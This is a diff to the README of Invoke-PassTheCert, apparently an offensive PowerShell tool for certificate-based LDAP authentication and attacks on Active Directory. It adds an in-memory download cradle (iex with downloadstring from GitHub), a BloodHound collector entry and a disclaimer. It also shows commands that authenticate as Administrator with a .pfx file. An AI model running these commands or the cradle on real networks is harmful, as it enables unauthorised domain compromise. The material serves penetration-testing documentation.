@@ -176,6 +176,7 @@ PS > Export-PfxCertificate -Cert (Get-ChildItem Cert:\CurrentUser\My\80923C91995
 Now, we may grab an LDAP Connection Instance, authenticating against an LDAP/S Server (e.g. `192.168.56.202:636`):
 
 ```powershell
+PS > powershell.exe
 PS > Import-Module .\Invoke-PassTheCert.ps1
 PS > $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '192.168.56.202' -Port 636 -Certificate 'Administrator.pfx'
 ```
@@ -187,6 +188,13 @@ PS > Import-Module .\Invoke-PassTheCert.ps1
 PS > Get-Help Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -Full
 PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.pfx' -ExportContentType 'pfx'
 PS > Invoke-PassTheCert-ExportLDAPConnectionInstanceToFile -LdapConnection $LdapConnection -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12' -ExportPassword 'ExP0rTP@sssw0Rd123!'
+```
+
+> Also, the script MAY be loaded in memory as follows (PowerShell Download Cradle):
+
+```powershell
+PS > iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jamarir/Invoke-PassTheCert/main/Invoke-PassTheCert.ps1')
+PS > Invoke-PassTheCert -?
 ```
 
 Last, but definitely not least, Read The Funny Manual !
@@ -344,6 +352,10 @@ Invoke-PassTheCert wrapper for LDAP enumerations.
 
 Invoke-PassTheCert wrapper for LDAP exploitations.
 
+- ***PowerHound***
+
+This function is a BloodHound ingestor / collector, i.e. returning the JSON files to be populated into BloodHound.
+
 - ***TODO***
 
 Makin' My Own Custom Function.
@@ -358,3 +370,9 @@ Makin' My Own Custom Function.
 - `LDAPEnum`: Implement more LDAP enumerations.
 - `LDAPExploit`: Implement more LDAP attacks.
 - `LDAPExtendedOperationPasswordModify`: Implement the `Password Modify` LDAP Extended Operation. *Alternatively, `UpdatePasswordOfIdentity` can be used, where the identity is the LDAP Connection Instance's account.*
+
+# Disclaimer
+
+THIS TOOL IS INTENDED FOR EDUCATIONAL PURPOSES ONLY, AND MUST NOT BE USED FOR ILLEGAL OR UNAUTHORIZED ACTIVITIES. IT IS THE RESPONSIBILITY OF THE USER TO ENSURE THAT THIS TOOL IS USED IN AN AUTHORIZED OR OWNED ENVIRONMENT, AND IN COMPLIANCE WITH ALL APPLICABLE LAWS AND REGULATIONS. USE OF THIS TOOL FOR MALICIOUS PURPOSES IS PROHIBITED.
+
+THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
